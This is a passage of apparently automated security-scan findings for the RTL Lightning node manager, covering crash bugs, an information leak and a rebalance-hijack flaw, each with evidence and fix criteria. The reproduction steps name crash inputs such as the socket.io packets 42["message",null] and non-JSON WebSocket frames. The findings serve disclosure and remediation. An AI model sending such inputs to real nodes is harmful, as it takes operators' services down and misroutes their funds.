1. The attacker is the LND REST endpoint RTL is configured against (compromised node, or a REST proxy/MITM in front of it) or any party able to disrupt the RTL->LND network path; TLS is not verified on that link (request.ts insecureAgent), so no key material is needed, and a plain connection reset suffices without any TLS position. The attacker needs no RTL credentials and sends nothing to RTL directly; they wait for the operator's browser to issue the Routing page's automatic /switch POST and make the upstream call fail. The .catch path dereferences `.error.statusCode` on a string, res.status(undefined) throws inside the promise, nothing catches it, and Node exits the process. Attack requirements PRESENT because the attacker must hold the LND endpoint or a position on the RTL->LND link; user interaction PASSIVE because the operator only opens a normal page.

## Recommended fix
1. forwardingHistory reads the status code from the wrong field (`eventsResponse.error.statusCode` instead of `eventsResponse.statusCode`), so every upstream error produces res.status(undefined), which throws. Fix criteria: On any upstream failure of /v1/switch the client receives a well-formed JSON error with the integer status from handleError (e.g. 503 for ECONNREFUSED, 4xx/5xx mirrored from LND) and the process keeps running. Verify by pointing lnServerUrl at a closed port and calling POST /switch: expect an error response, not a process exit.
2. The callback is invoked from inside a promise .catch and the resulting promise is neither returned to Express nor caught, so any exception in the response path becomes an unhandled rejection; the process has no last-resort unhandledRejection handler. Fix criteria: Exceptions thrown while sending the forwarding-history response (success or error branch) are caught and answered with a 500 if headers are not yet sent, and never surface as an unhandled rejection (e.g. by returning the promise to Express 5 or wrapping the callback). A process-level unhandledRejection handler that logs instead of exiting would provide defense in depth for this and similar fire-and-forget promise chains.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Uncaught Exception
**CWE:** [CWE-248](https://cwe.mitre.org/data/definitions/248.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257260

---

# Unauthenticated GET /conf/ leaks server log-file path after first settings save

## Details
`GET /rtl/api/conf/` (getApplicationSettings) is deliberately unauthenticated so the login page can learn the node name, theme and whether 2FA is on. For callers without a valid JWT the handler strips a denylist of server-side paths and URLs from the selected node (RTLConf.ts:209-219): `dbDirectoryPath`, `bitcoindConfigPath`, `lnServerUrl`, `swapServerUrl`, `channelBackupPath`, plus the SSO cookie path and redirect link; `removeSecureData` (common.ts:78-91) additionally removes `rtlConfFilePath`. `settings.logFile` is in neither list.

At boot `common.appConfig` is the parsed RTL-Config.json and `common.nodes[idx]` is built as a fresh object (config.ts:175), so a fresh install's appConfig nodes have no `logFile`. But `updateApplicationSettings` rebuilds the node list from `common.nodes` (`settings: { ...oldNode.settings }`, RTLConf.ts:413-424), whose `settings.logFile` config.ts:304 set to `rtlConfFilePath + '/logs/RTL-Node-<index>.log'`. `newAppConfig` (with logFile) replaces `common.appConfig` (line 476) and is persisted to RTL-Config.json (fileConfig deletes only authentication.options/runeValue). The frontend posts the whole configuration through this endpoint whenever the operator presses Update on Application Settings (app-settings.component.ts:44) or enables/disables 2FA (two-factor-auth.component.ts:98,116) — so from the first such save onward, and across every later restart, any unauthenticated client receives e.g. `"logFile": "/home/umbrel/RTL/logs/RTL-Node-1.log"`.

That string discloses the absolute config directory (where RTL-Config.json with the password hash, 2FA secret and credential paths lives), the operating OS user, and the node index naming scheme — exactly the information the handler already withholds via `channelBackupPath` (which defaults to the same directory) and `rtlConfFilePath`. The same response also returns the file's top-level `trustedProxies`, `host` and `port` to unauthenticated callers regardless of any save, revealing the reverse-proxy address RTL trusts for X-Forwarded-For. No secret material is exposed; the gain is server filesystem/infrastructure layout that aids targeting of any file-read or local-access vector.

## Evidence
1. [server/controllers/shared/RTLConf.ts:206–220](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/RTLConf.ts#L206-L220)
   Unauthenticated branch (jwt.verify fails): deletes SSO.rtlCookiePath/logoutRedirectLink, blanks dbDirectoryPath, resets authentication and deletes bitcoindConfigPath, lnServerUrl, swapServerUrl, enableOffers, enablePeerswap and channelBackupPath from the selected node — but leaves nodes[].settings.logFile (absolute server path) and the file's top-level trustedProxies/host/port in the JSON returned at line 223.
2. [server/controllers/shared/RTLConf.ts:413–428](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/RTLConf.ts#L413-L428)
   updateApplicationSettings rebuilds the node list from the live runtime nodes: `settings: { ...oldNode.settings }` copies common.nodes[i].settings wholesale, including the boot-derived settings.logFile, into runtimeConfig.nodes.
3. [server/controllers/shared/RTLConf.ts:446–476](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/RTLConf.ts#L446-L476)
   fileConfig deletes only authentication.options/runeValue per node, so logFile is persisted into RTL-Config.json (survives restarts); line 476 then installs newAppConfig as common.appConfig, which getApplicationSettings serves to every caller.
4. [server/utils/config.ts:304](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/config.ts#L304)
   logFile is derived as rtlConfFilePath + '/logs/RTL-Node-<index>.log', so disclosing it reveals the absolute directory holding RTL-Config.json (password hash, 2FA seed, credential paths) and typically the OS user's home directory.
5. [server/utils/config.ts:175](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/config.ts#L175)
   common.nodes[idx] is a fresh object, not a reference into the parsed file (common.appConfig = config at line 396), so on a fresh install appConfig.nodes carry no logFile until the first settings save copies it in; afterwards the file itself carries it on every boot.
6. [server/utils/common.ts:78–90](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L78-L90)
   removeSecureData, applied to every /conf response, deletes rtlConfFilePath, rtlPass, multiPass(Hashed), secret2FA and SSO.cookieValue and per-node credential paths, but not nodes[].settings.logFile nor the top-level trustedProxies/host/port — the intent to hide rtlConfFilePath is defeated by the sibling field that embeds it.
7. [server/routes/shared/RTLConf.ts:9](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/routes/shared/RTLConf.ts#L9)
   GET / (getApplicationSettings) is mounted without isAuthenticated; test/backend/route-guards.test.mjs lists 'shared/RTLConf GET /' as a deliberately public route for the login page.

## Impact
Discloses server filesystem layout (absolute config directory, OS user home, log-file naming) and trusted-proxy/bind configuration to unauthenticated callers. No credential, hash or write capability is exposed; limited confidentiality impact only.

## Reproduction steps
1. Any network client that can reach RTL's HTTP port (or the reverse proxy in front of it) issues GET /rtl/api/conf/ with no credentials and no CSRF token (GET). The logFile disclosure requires that the operator has at some point saved application settings or toggled 2FA in the UI — a normal operation, not a disabled control — hence AT:P; trustedProxies/host/port are returned regardless. No operator interaction is needed at request time.

## Recommended fix
1. The unauthenticated branch of getApplicationSettings and removeSecureData use denylists of keys to strip; settings.logFile (a boot-derived absolute path that enters appConfig after the first save) and the top-level trustedProxies/host/port are missing from them. Fix criteria: The unauthenticated response contains only the fields the login page needs (node name, index, implementation, theme/persona, enable2FA, allowPasswordUpdate, SSO.rtlSSO) and no filesystem path or infrastructure address; verified by saving a setting, fetching /conf/ without a token and asserting no value contains a path separator and trustedProxies/host/port are absent.
2. logFile is a runtime-only derived value that updateApplicationSettings copies into common.appConfig and RTL-Config.json because it rebuilds nodes from common.nodes without excluding boot-derived fields. Fix criteria: Boot-derived runtime fields (logFile) are excluded from both the in-memory appConfig snapshot and the persisted file on save; after a save RTL-Config.json contains no settings.logFile and the authenticated /conf response does not need it.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Information disclosure
**CWE:** [CWE-497](https://cwe.mitre.org/data/definitions/497.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257255

---

# CLN socket.io message handler crashes RTL on null or missing event payload

## Details
RTL's Core Lightning event client (server/controllers/cln/webSocketClient.ts, connectWithClient) connects to the configured clnrest socket.io endpoint once the operator logs in and selects a CLN node (RTLConf.updateSelectedNode -> wsServer.updateLNWSClientDetails -> connectToNodeClient -> eventEmitterCLN 'CONNECT' -> connect -> connectWithClient). Its 'message' listener (lines 86-89) is

  clWsClt.webSocketClient.on('message', (msg) => {
    this.logger.log({ ..., level: 'DEBUG', ..., data: msg.data });
    this.wsServer.sendEventsToAllLNClients(JSON.stringify({ source: 'CLN', data: msg }), ...);
  });

`msg.data` is evaluated unconditionally while the logger argument object is built, so the log level is irrelevant. A socket.io EVENT packet `42["message"]` delivers the event with no argument (msg === undefined) and `42["message",null]` delivers null; both pass socket.io-parser's payload check (an array whose first element is a non-reserved string -- 'message' is not reserved), and both make `msg.data` throw a TypeError.

Dependency assumption (socket.io-client 4.8.3, engine.io-client 6.6.6, socket.io-parser 4.2.7, all pinned in package-lock.json): Manager.ondecoded dispatches each decoded packet through engine.io-client's nextTick helper (process.nextTick in the Node build, a resolved-Promise .then in the browser build) precisely so that a listener exception does not disturb the Manager's own state. Under either dispatch the exception leaves socket.io-client uncaught: as an 'uncaughtException' from the nextTick callback, or as an unhandled rejection, which Node >= 15 (engines: node >= 20.19.0) treats as fatal by default. rtl.js registers only SIGINT and nothing in server/ registers 'uncaughtException' or 'unhandledRejection', so the RTL process exits; the REST API, the UI, the browser WebSocket and the event clients for every other configured node go down with it. After a supervisor restart the next login / node selection reconnects, so the attacker can keep RTL down.

Who controls the input: the clnrest instance RTL is configured against, or an on-path host between RTL and it. The connection is made with `rejectUnauthorized: false` (line 67) -- and is plain ws when lnServerUrl is http:// -- so the peer is unauthenticated and an active MITM can complete the socket.io CONNECT handshake and emit the crafted packet. The recorded threat model's adversary 4 ('the Lightning node RTL talks to, or a MITM on that link where TLS is not verified ... attacker-shaped JSON that the backend parses') covers this position, and SECURITY.md excludes only DoS that requires authenticated operator access.

The LND sibling parses node data inside promise handlers with .catch; the Eclair sibling has a comparable unguarded parse (filed separately).

## Evidence
1. [server/controllers/cln/webSocketClient.ts:86–89](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/cln/webSocketClient.ts#L86-L89)
   The 'message' listener builds the logger argument object with `data: msg.data` before any check and regardless of log level; a socket.io EVENT packet 42["message"] (msg === undefined) or 42["message",null] makes this a TypeError thrown inside socket.io-client's packet dispatch, which nothing in RTL catches.
2. [server/controllers/cln/webSocketClient.ts:63–67](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/cln/webSocketClient.ts#L63-L67)
   The connection to the clnrest socket.io endpoint is made with rejectUnauthorized:false (and the URL scheme decides TLS at all), so an on-path host can terminate the connection, answer the CONNECT handshake and inject arbitrary socket.io packets.
3. [server/utils/webSocketServer.ts:148–150](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/webSocketServer.ts#L148-L150)
   Reachability: when the operator's session selects a CLN node (RTLConf.updateSelectedNode -> updateLNWSClientDetails -> connectToNodeClient) eventEmitterCLN 'CONNECT' fires and connectWithClient registers the listener; the RTL process then holds the open socket.io connection for as long as the node is selected, and reconnects on drop.
4. [rtl.js:14–16](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/rtl.js#L14-L16)
   Only SIGINT is handled; no 'uncaughtException' or 'unhandledRejection' handler exists anywhere in rtl.js or server/ (rg confirms), so the exception escaping the listener terminates the Node process.

## Impact
Deterministic termination of the whole RTL process, which serves every configured node (including LND/Eclair nodes on other links). No disclosure or modification of data by this path.

## Reproduction steps
1. Attacker is the clnrest endpoint or an on-path host between RTL and it; the code itself disables certificate verification (rejectUnauthorized:false), so a MITM needs no deployment misconfiguration to terminate the link. Once the operator has selected the CLN node RTL holds an open socket.io connection; the attacker answers the CONNECT handshake and emits one EVENT packet 42["message"] or 42["message",null]. The listener throws on msg.data, socket.io-client dispatches listeners via nextTick so the exception escapes it, and RTL has no process-level handler, so the process exits. No privileges on RTL and no operator interaction are needed; the on-path (or node-side) position is the attack requirement. Repeatable on every reconnect.

## Recommended fix
1. The CLN 'message' listener dereferences the node-supplied event payload (msg.data) without checking it exists, inside a dispatch path where an exception is fatal to the process. Fix criteria: A 'message' event carrying no payload, null, or a non-object is logged and dropped; the connection and the RTL process remain up and later valid notifications are still forwarded. Verify by emitting such events from the clnrest side and confirming RTL keeps serving.
2. No process-level handler exists for exceptions escaping third-party event callbacks, so one unguarded listener takes down the multi-node instance. Fix criteria: An exception escaping an event-client callback is logged and does not terminate the process (or terminates only the affected node client); the browser-facing server and other node clients keep running.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** NULL pointer dereference
**CWE:** [CWE-476](https://cwe.mitre.org/data/definitions/476.html)
**Attack vector:** ADJACENT
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257252

---

# Eclair WebSocket message handler crashes RTL on non-JSON or null frame from node

## Details
RTL's Eclair event client (server/controllers/eclair/webSocketClient.ts, connectWithClient) is established as soon as the operator logs in and selects an Eclair node (frontend setSelectedNode -> GET /rtl/api/conf/updateSelNode -> RTLWebSocketServer.updateLNWSClientDetails -> eventEmitterECL 'CONNECT' -> connect). Its onmessage handler (lines 79-87) runs

  msg = (typeof msg.data === 'string') ? JSON.parse(msg.data) : msg.data;
  if (msg.type && ...)

with no exception handling. Any text frame whose payload is not valid JSON makes JSON.parse throw, and the valid JSON text `null` parses and then `null.type` throws a TypeError.

The handler is invoked synchronously by ws 8.21.0: Receiver._write -> dataMessage -> emit('message') -> WebSocket.receiverOnMessage -> the onmessage EventTarget wrapper -> listener, with no try/catch on that chain (assumption about ws 8.21.0 as pinned in package.json; ws does not isolate listener exceptions). The exception therefore propagates out of the socket 'data' event into the event loop. rtl.js registers only a SIGINT handler and nothing in server/ registers 'uncaughtException' or 'unhandledRejection', so the Node process exits. The whole RTL instance (REST API, UI, WebSocket to the browser, and the event clients for every other configured node) goes down together.

Who controls the input: the Eclair node RTL is configured against, or any host on the network path between RTL and that node. The documented Eclair lnServerUrl is `http://<eclair api server ip address>:port` (.github/docs/Eclair_setup.md), which this code rewrites to `ws://`, so the link is cleartext and frame injection needs only an on-path position, no TLS to defeat. The threat model lists 'the Lightning node RTL talks to (or a MITM on that link)' as adversary 4 and names 'attacker-shaped JSON that the backend parses' as its vector.

After a supervisor restarts RTL, the browser's reconnect and the next updateSelNode re-establish the Eclair link (reconnet with 0.5-64s backoff), so an attacker holding the position can keep RTL down.

The LND sibling (server/controllers/lnd/webSocketClient.ts subscribeToInvoice) does its JSON.parse of node data inside a promise .then with a .catch, so the same malformed input is handled there; the Eclair handler is the exception. The CLN sibling has an analogous unguarded access (filed separately).

## Evidence
1. [server/controllers/eclair/webSocketClient.ts:79–87](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/eclair/webSocketClient.ts#L79-L87)
   onmessage does JSON.parse(msg.data) at line 81 and then dereferences msg.type at line 82 with no try/catch. A text frame that is not JSON throws SyntaxError; the JSON text 'null' parses and null.type throws TypeError. The handler runs inside ws's receiver -> socket 'data' path (or a microtask of it), so the exception is uncaught. This is the location the fix must change.
2. [server/controllers/eclair/webSocketClient.ts:59–64](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/eclair/webSocketClient.ts#L59-L64)
   connectWithClient rewrites lnServerUrl http -> ws and opens the WebSocket; the documented Eclair lnServerUrl is http://, so the link is cleartext ws:// and any on-path host can inject frames. onclose/onerror call reconnet (0.5-64s backoff), and the next updateSelNode after a supervisor restart re-establishes the link, so the crash repeats.
3. [rtl.js:14–16](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/rtl.js#L14-L16)
   Only SIGINT is handled; no process.on('uncaughtException') or 'unhandledRejection' exists anywhere in rtl.js, server/ or backend/, so the exception terminates the Node process.
4. [server/utils/webSocketServer.ts:133–159](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/webSocketServer.ts#L133-L159)
   connectToNodeClient emits eventEmitterECL 'CONNECT' when an authenticated operator selects an ECL node (GET /rtl/api/conf/updateSelNode/:curr/:prev, isAuthenticated), which ECLWebSocketClient's constructor turns into connect(); this is the normal UI flow, so the vulnerable link exists in every Eclair deployment once the operator has logged in.
5. [server/controllers/lnd/webSocketClient.ts:64–82](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/webSocketClient.ts#L64-L82)
   Sibling implementation for LND performs the same JSON.parse of node data inside a promise .then with a .catch, so a malformed body is handled there; the Eclair handler lacks the equivalent guard.

## Impact
Deterministic termination of the RTL process: REST API, UI, browser WebSocket and event clients for all configured nodes stop. No data is disclosed or altered.

## Reproduction steps
1. Attacker is the Eclair endpoint or an on-path host between RTL and Eclair (cleartext ws:// per the documented http:// lnServerUrl). Once the operator has logged in and selected the Eclair node, RTL holds an open WebSocket to it; the attacker sends one text frame that is not JSON (or the text `null`). The handler throws synchronously, nothing catches it, and the process exits. Repeatable on every reconnect. Requires network position between RTL and its node (or control of the node), hence attack requirements present and adjacent vector.

## Recommended fix
1. The Eclair onmessage handler parses and dereferences node-supplied frame content without exception handling, inside a synchronous event path where an exception is fatal to the process. Fix criteria: A text frame from the Eclair endpoint that is not a JSON object (invalid JSON, `null`, a primitive, an array) is logged and dropped, the connection and the RTL process stay up, and subsequent valid events are still forwarded. Verify by sending such frames over the link and observing RTL continues serving.
2. RTL has no last-resort handler for uncaught exceptions or unhandled rejections raised from third-party event callbacks, so any single unguarded callback can terminate the whole multi-node instance. Fix criteria: An exception escaping an event client callback is logged and does not terminate the process (or terminates only the affected node client); the browser-facing server and the other node clients keep running.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Uncaught Exception
**CWE:** [CWE-248](https://cwe.mitre.org/data/definitions/248.html)
**Attack vector:** ADJACENT
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257250

---

# LND rebalance target chosen by first case-insensitive remote_alias match, letting a peer hijack rebalances

## Details
The LND Circular Rebalance dialog lets the operator pick the channel the rebalance payment should return through by typing the peer's alias into 'Receive from Peer'. When the operator types and leaves the field, presses Enter, or clicks 'Select Fee' while the control still holds a string (the input's (change) handler and onSelectFee both call it), onSelectedPeerChanged() resolves the string with:

  foundChannels = activeChannels.filter(c => c.remote_alias?.length === typed.length && c.remote_alias?.toLowerCase().indexOf(typed.toLowerCase()) === 0)
  if (foundChannels.length > 0) selRebalancePeer.setValue(foundChannels[0])

This is case-insensitive alias equality, and the first of any number of matches is accepted silently. remote_alias is neither unique nor chosen by the operator: server/controllers/lnd/channels.ts getAliasForChannel copies it verbatim from the remote peer's gossip node_announcement via LND /v1/graph/node/<pubkey> (falling back to the first 20 hex chars of the pubkey for peers with no announcement, which another peer can announce as its alias). A remote peer with an active channel to the operator's LND node (remote_balance > 0 is all the filter requires) can announce an alias equal, modulo case, to that of another of the operator's channel peers.

activeChannels is sorted by lower-cased remote_alias with a stable sort, so for colliding aliases index 0 is decided by the order LND's ListChannels returned them, which the reducer and the table component pass through unchanged. Assumption about lnd (the dependency): ListChannels iterates channeldb's open-channel bucket keyed by remote node pubkey, so the attacker can grind a node key that sorts before the impersonated peer's and reliably become foundChannels[0]; even without that, the outcome is a coin flip the operator cannot see.

The stepper label then shows only 'Peer: <remote_alias>' (remote_pubkey only when the alias is empty) and displayFn shows the alias alone, so the two channels cannot be told apart at the fee or confirmation step. onRebalance() creates (or reuses) a 'Local-Rebalance-<amt>-Sats' invoice and sendPayment() dispatches it with outgoing_chan_ids = [source channel], allow_self_payment = true and last_hop_pubkey = the resolved channel's remote_pubkey; the backend forwards this to LND /v2/router/send. LND pins the attacker's node as the penultimate hop: the operator's outbound liquidity is pushed into the attacker's channel instead of the intended one, the attacker is paid its advertised forwarding fee for the final hop (bounded by the operator's fee_limit_sat, which was set with the intended peer in mind), and the intended rebalance still has to be repeated. If the attacker's channel lacks inbound capacity for the amount the payment simply fails.

This is the LND sibling of the verified Eclair record ecl-rebalance-alias-collision-target-hijack, whose description already names this file and line range. The sibling Open Channel dialog (open-channel.component.ts onSelectedPeerChanged) does the equivalent alias resolution and accepts it only when exactly one peer matches; the rebalance modal lacks that guard. The autocomplete option list renders alias plus chan_id precisely because aliases collide, but the typed path discards that disambiguation.

Impact is limited: funds stay in the operator's own channels apart from the forwarding fee paid to the attacker, and the attack needs an operator who types the alias rather than clicking it. But the source (gossip alias) is set by an unauthenticated remote peer named in the threat model as adversary 3, the sink is a fund-moving action whose target the operator did not choose, and the fix is the uniqueness check the codebase already applies elsewhere.

## Evidence
1. [src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts:275–286](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts#L275-L286)
   onSelectedPeerChanged resolves the typed 'Receive from Peer' string by filtering activeChannels on remote_alias length equality plus case-insensitive prefix match (i.e. case-insensitive alias equality) and unconditionally sets the control to foundChannels[0]. It never checks that the match is unique and never matches on chan_id or remote_pubkey. This is the code the fix must change.
2. [src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts:239–266](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts#L239-L266)
   sendPayment builds the SendPayment payload with last_hop_pubkey = selRebalancePeer.value.remote_pubkey, outgoing_chan_ids = [selChannel.chan_id], allow_self_payment = true and the operator's fee_limit_sat, and dispatches sendPayment. Whichever channel [0] resolved to becomes the pinned penultimate hop the rebalance returns through.
3. [src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts:207–232](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts#L207-L232)
   onRebalance only checks that the resolved value has a remote_pubkey, then either reuses an unsettled 'Local-Rebalance-<amt>-Sats' invoice or dispatches saveNewInvoice; NEWLY_SAVED_INVOICE_LND (lines 116-120) feeds the payment request straight into sendPayment. No confirmation of the resolved channel's identity happens between resolution and payment.
4. [src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.html:41–44](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.html#L41-L44)
   The input's (change) handler calls onSelectedPeerChanged with the raw typed string when the operator types the alias and blurs or presses Enter instead of clicking an autocomplete option (optionSelected hands over a Channel object, which the typeof check skips). The option list renders '{{remote_alias}} - {{chan_id}}', showing the project knows aliases collide; the typed path discards that disambiguation.
5. [src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts:138–145](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts#L138-L145)
   A second typed entry point: the 'Select Fee' button handler onSelectFee itself calls onSelectedPeerChanged when the control still holds a string, so a typed alias is resolved to foundChannels[0] even if the operator never blurred the field; the step then advances with the resolved channel.
6. [src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts:74–79](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts#L74-L79)
   activeChannels is every active channel other than the source with remote_balance > 0 (not amount-filtered), re-sorted by lower-cased remote_alias. Array.prototype.sort is stable, so two channels whose aliases are equal modulo case keep the order of data.message.channels, which is the store's channels array as returned by GET /lnd/channels (LND's ListChannels order, unmodified by the reducer or by calculateUptime). The operator has no say in which of them is index 0.
7. [src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts:165–182](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts#L165-L182)
   After resolution the stepper label shows only 'Peer: <remote_alias>'; remote_pubkey is used only when the alias is empty, and displayFn (lines 288-290) likewise shows the alias alone. Two channels with the same alias are indistinguishable to the operator at the fee and confirmation steps.
8. [server/controllers/lnd/channels.ts:9–19](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/channels.ts#L9-L19)
   getAliasForChannel copies aliasBody.node.alias verbatim from LND GET /v1/graph/node/<remote_pubkey> (the remote peer's gossip node_announcement, attacker-chosen, up to 32 bytes) into channel.remote_alias, falling back to the first 20 hex chars of the pubkey for peers without an announcement - a string another peer can announce as its alias. This alias is the only key the rebalance modal's typed path matches on.
9. [server/controllers/lnd/payments.ts:159–188](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/payments.ts#L159-L188)
   sendPayment forwards the body to LND /v2/router/send, converting last_hop_pubkey from hex to base64. With allow_self_payment and last_hop_pubkey set, LND routes the self-payment so the pinned node is the penultimate hop: the resolved peer forwards the final HTLC into the operator's node and collects its forwarding fee, and the operator's outbound liquidity lands on that peer's channel.
10. [src/app/lnd/store/lnd.effects.ts:691–699](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/store/lnd.effects.ts#L691-L699)
   The sendPayment effect posts the payload (minus uiMessage/fromDialog) to /rtl/api/lnd/payments/send unchanged, so last_hop_pubkey chosen by the modal reaches the backend as-is.
11. [src/app/lnd/peers-channels/channels/channels-tables/channel-open-table/channel-open-table.component.ts:183–196](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/channels/channels-tables/channel-open-table/channel-open-table.component.ts#L183-L196)
   Reachability: the LND open-channels table's Circular Rebalance action opens ChannelRebalanceComponent with the store's channel list (channelsData) and the selected channel; this is live production UI shipped in the frontend bundle (frontend/190.*.js carries the same last_hop_pubkey payload).
12. [src/app/lnd/peers-channels/channels/open-channel-modal/open-channel.component.ts:128–142](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/channels/open-channel-modal/open-channel.component.ts#L128-L142)
   The sibling Open Channel dialog performs the same typed-alias-to-peer resolution and accepts it only when exactly one peer matches (selPeer.length === 1), otherwise flagging notfound - the uniqueness guard the rebalance modal omits.

## Impact
The operator's node executes a self-payment whose return channel the operator did not choose: outbound liquidity moves into the attacker's channel and the attacker's forwarding fee for the final hop is paid, with the intended rebalance still outstanding. Assumption about lnd: /v2/router/send honours last_hop_pubkey as the penultimate hop and enforces fee_limit_sat over the whole route, so the attacker's take is bounded by the operator's fee limit. No data is disclosed and RTL stays available; loss is bounded by the rebalance amount's relocation and the fee limit, so integrity impact is low.

## Reproduction steps
